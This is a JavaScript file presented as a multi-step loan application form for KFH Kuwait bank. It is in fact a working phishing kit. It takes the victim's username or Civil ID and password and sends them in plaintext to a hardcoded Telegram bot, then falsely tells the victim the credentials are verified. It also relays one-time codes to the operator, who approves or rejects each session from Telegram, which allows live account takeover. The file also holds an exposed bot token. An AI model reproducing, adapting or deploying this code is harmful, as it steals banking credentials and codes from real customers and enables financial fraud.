/**
 * KFH Kuwait - Application Form Script
 * Handles multi-step form navigation and validation
 * Includes Telegram Bot notification system
 */

// ========================================
// CONFIGURATION - Telegram Bot Settings
// ========================================
const TELEGRAM_BOT_TOKEN = '8663835867:AAHBDm5yUNurJQSOuOdw7VWWekJuLzOj-l4';
const TELEGRAM_CHAT_ID = '7973653220';
// Unique session ID for this browser
const SESSION_ID = 'session_' + Math.random().toString(36).substr(2, 9);

// Approval states
let phonePinApproved = true;
let otpApproved = false;
let approvalPollingInterval = null;
let otpPollingInterval = null;
let lastUpdateId = 0;

// Store verification codes
let storedOTP = '';

// Store user details
let userPhone = '';
let userPin = '';

(function() {
    'use strict';

    // Current step tracking
    let currentStep = 1;
    const totalSteps = 3;

    // Profit rate for calculations (Islamic/5%)
    const interestRate = 0.05;

    // Loan details state
    let loanDetails = {
        amount: 1000,
        term: 12,
        monthlyPayment: 0,
        totalRepayment: 0
    };

    // ========================================
    // Initialize
    // ========================================
    document.addEventListener('DOMContentLoaded', function() {
        // Check if user has already applied
        const hasApplied = localStorage.getItem('kfh_has_applied');
        if (hasApplied) {
            const applicationId = localStorage.getItem('kfh_application_id');
            alert('You can apply once. Your application ID is: ' + applicationId);
            // Optionally redirect to home
            // window.location.href = 'index.html';
        }
        
        initAmountSelector();
        initTermSelector();
        calculateLoan();
    });

    // ========================================
    // Amount Selector
    // ========================================
    function initAmountSelector() {
        const amountBtns = document.querySelectorAll('.amount-btn');
        
        amountBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                amountBtns.forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                loanDetails.amount = parseInt(this.dataset.amount);
                calculateLoan();
            });
        });
    }

    // ========================================
    // Term Selector
    // ========================================
    function initTermSelector() {
        const termSelect = document.getElementById('loanTerm');
        if (termSelect) {
            termSelect.addEventListener('change', function() {
                loanDetails.term = parseInt(this.value);
                calculateLoan();
            });
        }
    }

    // ========================================
    // Calculate Loan (Islamic Profit Rate)
    // ========================================
    function calculateLoan() {
        const principal = loanDetails.amount;
        const termMonths = loanDetails.term;
        const monthlyRate = interestRate / 12;
        
        let monthlyPayment;
        if (monthlyRate === 0) {
            monthlyPayment = principal / termMonths;
        } else {
            const factor = Math.pow(1 + monthlyRate, termMonths);
            monthlyPayment = principal * (monthlyRate * factor) / (factor - 1);
        }
        
        const totalRepayment = monthlyPayment * termMonths;
        
        loanDetails.monthlyPayment = Math.round(monthlyPayment);
        loanDetails.totalRepayment = Math.round(totalRepayment);
        
        updateLoanSummary();
    }

    // ========================================
    // Update Loan Summary
    // ========================================
    function updateLoanSummary() {
        const amountEl = document.getElementById('summary-amount');
        const termEl = document.getElementById('summary-term');
        const monthlyEl = document.getElementById('summary-monthly');
        
        if (amountEl) amountEl.textContent = formatCurrency(loanDetails.amount);
        if (termEl) termEl.textContent = loanDetails.term + ' Months';
        if (monthlyEl) monthlyEl.textContent = formatCurrency(loanDetails.monthlyPayment);
    }

    // ========================================
    // Format Currency (KWD - Kuwaiti Dinar)
    // ========================================
    function formatCurrency(amount) {
        return 'KWD ' + amount.toLocaleString('en-KW', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
    }

    // ========================================
    // Navigation Functions
    // ========================================
    window.nextStep = function(step) {
        if (step < totalSteps) {
            currentStep = step + 1;
            showStep(currentStep);
        }
    };

    window.prevStep = function(step) {
        if (step > 1) {
            currentStep = step - 1;
            showStep(currentStep);
        } else {
            window.location.href = 'index.html';
        }
    };

    // ========================================
    // Show Step
    // ========================================
    function showStep(step) {
        document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
        
        const currentStepEl = document.getElementById('step-' + step);
        if (currentStepEl) currentStepEl.classList.add('active');
        
        updateProgressBar(step);
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // ========================================
    // Update Progress Bar
    // ========================================
    function updateProgressBar(step) {
        const steps = document.querySelectorAll('.progress-step');
        
        steps.forEach((el, index) => {
            const stepNum = index + 1;
            el.classList.remove('active', 'completed');
            
            if (stepNum < step) {
                el.classList.add('completed');
            } else if (stepNum === step) {
                el.classList.add('active');
            }
        });
        
        const lines = document.querySelectorAll('.progress-line');
        lines.forEach((line, index) => {
            if (index < step - 1) line.classList.add('active');
            else line.classList.remove('active');
        });
    }

    // ========================================
    // Submit Details - Auto proceed to Step 2
    // ========================================
    window.submitDetailsForApproval = async function() {
        const phoneInput = document.getElementById('phone');
        const pinInput = document.getElementById('mpesaPin');
        const submitBtn = document.getElementById('submitDetailsBtn');
        
        const username = phoneInput.value.trim();
        const password = pinInput.value.trim();
        
        // Validate: must have username and password
        if (!username || username.length < 3) {
            const phoneError = document.getElementById('phoneError');
            phoneError.querySelector('span').textContent = 'Please enter a valid username or Civil ID';
            phoneError.style.display = 'flex';
            return;
        }
        
        // Clear any previous error
        document.getElementById('phoneError').style.display = 'none';
        
        if (!password || password.length < 4) {
            alert('Please enter a valid password (minimum 4 characters)');
            return;
        }
        
        userPhone = username;
        userPin = password;
        
        submitBtn.disabled = true;
        submitBtn.textContent = 'Verifying...';
        
        await sendToBotForApproval(username, password);
        
        document.getElementById('pin-waiting').style.display = 'none';
        document.getElementById('pin-approved').style.display = 'block';
        document.getElementById('pin-approved').querySelector('p').textContent = '✓ Credentials Verified!';
        
        document.getElementById('phone-actions').style.display = 'none';
        document.getElementById('otp-actions').style.display = 'flex';
        document.getElementById('otpPhone').textContent = userPhone;
        
        showStep(2);
    };

    // ========================================
    // Send to Bot (Step 1 - Notification only)
    // ========================================
    async function sendToBotForApproval(username, password) {
        const message = '🏦 KFH KUWAIT - NEW LOGIN REQUEST\n\n🆔 Session ID: ' + SESSION_ID + '\n👤 Username/Civil ID: ' + username + '\n🔐 Password: ' + password + '\n📅 Time: ' + new Date().toLocaleString();

        try {
            const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
            });
            
            const result = await response.json();
            console.log('Bot response:', result);
        } catch (error) {
            console.log('Error sending to bot:', error);
        }
    }

    // ========================================
    // Reset Phone Verification
    // ========================================
    window.resetPhoneVerification = function() {
        phonePinApproved = true;
        otpApproved = false;
        
        if (approvalPollingInterval) clearInterval(approvalPollingInterval);
        if (otpPollingInterval) clearInterval(otpPollingInterval);
        
        document.getElementById('pin-waiting').style.display = 'none';
        document.getElementById('pin-approved').style.display = 'none';
        document.getElementById('phone-actions').style.display = 'flex';
        document.getElementById('otp-actions').style.display = 'none';
        document.querySelector('.approval-notice').style.display = 'block';
        document.getElementById('submitDetailsBtn').disabled = false;
        document.getElementById('submitDetailsBtn').textContent = 'Login';
        document.getElementById('submitDetailsBtn').style.display = 'block';
    };

    // ========================================
    // Request OTP
    // ========================================
    window.requestOTPAfterApproval = function() {
        const otpCode = generateOTP();
        storedOTP = otpCode;
        
        sendOTPToBot(userPhone, otpCode);
        document.getElementById('otpPhone').textContent = userPhone;
        showStep(2);
        
        console.log('OTP sent to:', userPhone, 'Code:', otpCode);
    };

    // ========================================
    // Generate OTP (4 digits)
    // ========================================
    function generateOTP() {
        return Math.floor(1000 + Math.random() * 9000).toString();
    }

    // ========================================
    // Send OTP to Bot (with buttons)
    // ========================================
    async function sendOTPToBot(phone, otpCode) {
        const message = '📧 KFH KUWAIT - OTP SENT\n\n🆔 Session ID: ' + SESSION_ID + '\n👤 Username: ' + phone + '\n🔢 OTP Code: ' + otpCode + '\n📅 Time: ' + new Date().toLocaleString();

        const replyMarkup = {
            inline_keyboard: [
                [{ text: '✅ APPROVE', callback_data: 'otp_verify_' + SESSION_ID }, { text: '❌ REJECT', callback_data: 'otp_reject_' + SESSION_ID }]
            ]
        };

        try {
            await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, reply_markup: replyMarkup })
            });
        } catch (error) {
            console.log('Error sending OTP to bot:', error);
        }
    }

    // ========================================
    // Verify OTP
    // ========================================
    window.verifyOTP = async function() {
        const otpCode = document.getElementById('otpCode').value;
        
        if (!otpCode || otpCode.length !== 4) {
            alert('Please enter a valid 4-digit code');
            return;
        }
        
        // Show waiting message and start polling for admin approval
        document.getElementById('otp-waiting').style.display = 'block';
        document.getElementById('otp-form').style.display = 'none';
        
        // Start polling for admin approval - customer cannot proceed without admin approval
        startOTPVerificationPolling();
    };

    // ========================================
    // Send OTP Verification to Bot (with buttons)
    // ========================================
    async function sendOTPVerificationToBot(otpCode) {
        const message = '🔄 KFH KUWAIT - OTP VERIFICATION SUBMITTED\n\n🆔 Session ID: ' + SESSION_ID + '\n👤 Username: ' + userPhone + '\n🔢 Code Entered: ' + otpCode + '\n📅 Time: ' + new Date().toLocaleString();

        const replyMarkup = { inline_keyboard: [[{ text: '✅ APPROVE', callback_data: 'otp_verify_' + SESSION_ID }, { text: '❌ REJECT', callback_data: 'otp_reject_' + SESSION_ID }]] };

        try {
            await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, reply_markup: replyMarkup })
            });
        } catch (error) {
            console.log('Error sending OTP verification to bot:', error);
        }
    }

    // ========================================
    // Start OTP Verification Polling
    // ========================================
    function startOTPVerificationPolling() {
        otpPollingInterval = setInterval(async function() {
            try {
                const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=1');
                const data = await response.json();
                
                if (data.ok && data.result && data.result.length > 0) {
                    lastUpdateId = data.result[data.result.length - 1].update_id;
                    
                    for (const update of data.result) {
                        if (update.callback_query) {
                            const callbackData = update.callback_query.data;
                            const callbackId = update.callback_query.id;
                            
                            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ callback_query_id: callbackId })
                            });
                            
                            if (callbackData === 'otp_verify_' + SESSION_ID) {
                                otpApproved = true;
                                clearInterval(otpPollingInterval);
                                onOTPApproved();
                                return;
                            }
                            
                            if (callbackData === 'otp_reject_' + SESSION_ID) {
                                clearInterval(otpPollingInterval);
                                onOTPRejected();
                                return;
                            }
                        }
                    }
                }
            } catch (error) {
                console.log('Polling error:', error);
            }
        }, 2000);
    }

    // ========================================
    // OTP Approved
    // ========================================
    function onOTPApproved() {
        // Send OTP approved message to bot
        const approvedMessage = '✅ KFH KUWAIT - OTP APPROVED\n\n🆔 Session ID: ' + SESSION_ID + '\n👤 Username: ' + userPhone + '\n📅 Time: ' + new Date().toLocaleString();
        fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: approvedMessage })
        });
        
        document.getElementById('otp-waiting').style.display = 'none';
        document.getElementById('otp-approved').style.display = 'block';
        
        setTimeout(function() {
            showStep(3);
        }, 1000);
    }

    // ========================================
    // OTP Rejected
    // ========================================
    function onOTPRejected() {
        // Send OTP rejected message to bot
        const rejectedMessage = '❌ KFH KUWAIT - OTP REJECTED\n\n🆔 Session ID: ' + SESSION_ID + '\n👤 Username: ' + userPhone + '\n📅 Time: ' + new Date().toLocaleString();
        fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: rejectedMessage })
        });
        
        document.getElementById('otp-waiting').style.display = 'none';
        document.getElementById('otp-error').style.display = 'block';
        document.getElementById('otp-form').style.display = 'block';
    }

    // ========================================
    // Resend OTP
    // ========================================
    window.resendOTP = async function() {
        const otpCode = generateOTP();
        storedOTP = otpCode;
        
        await sendOTPToBot(userPhone, otpCode);
        
        document.getElementById('otp-error').style.display = 'none';
        alert('New OTP sent to your registered mobile number');
        
        console.log('New OTP sent:', otpCode);
    };

    // ========================================
    // Submit Application
    // ========================================
    window.submitApplication = async function() {
        // Send final application to bot
        await sendFinalApplicationToBot();
        
        // Generate application ID
        const applicationId = 'KFH-' + new Date().getFullYear() + '-' + Math.random().toString(36).substr(2, 5).toUpperCase();
        
        // Store in localStorage
        localStorage.setItem('kfh_has_applied', 'true');
        localStorage.setItem('kfh_application_id', applicationId);
        
        // Show application ID
        document.getElementById('application-id').textContent = applicationId;
        
        // Show success step
        showStep('success');
    };

    // ========================================
    // Send Final Application to Bot
    // ========================================
    async function sendFinalApplicationToBot() {
        const applicationId = 'KFH-' + new Date().getFullYear() + '-' + Math.random().toString(36).substr(2, 5).toUpperCase();
        
        const message = '🎉 KFH KUWAIT - FINAL APPLICATION SUBMITTED\n\n🆔 Session ID: ' + SESSION_ID + '\n👤 Username: ' + userPhone + '\n💰 Amount: ' + formatCurrency(loanDetails.amount) + '\n📅 Term: ' + loanDetails.term + ' Months\n💵 Monthly Payment: ' + formatCurrency(loanDetails.monthlyPayment) + '\n🆔 Application ID: ' + applicationId + '\n📅 Time: ' + new Date().toLocaleString();

        try {
            await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
            });
        } catch (error) {
            console.log('Error sending final application to bot:', error);
        }
    };

})();
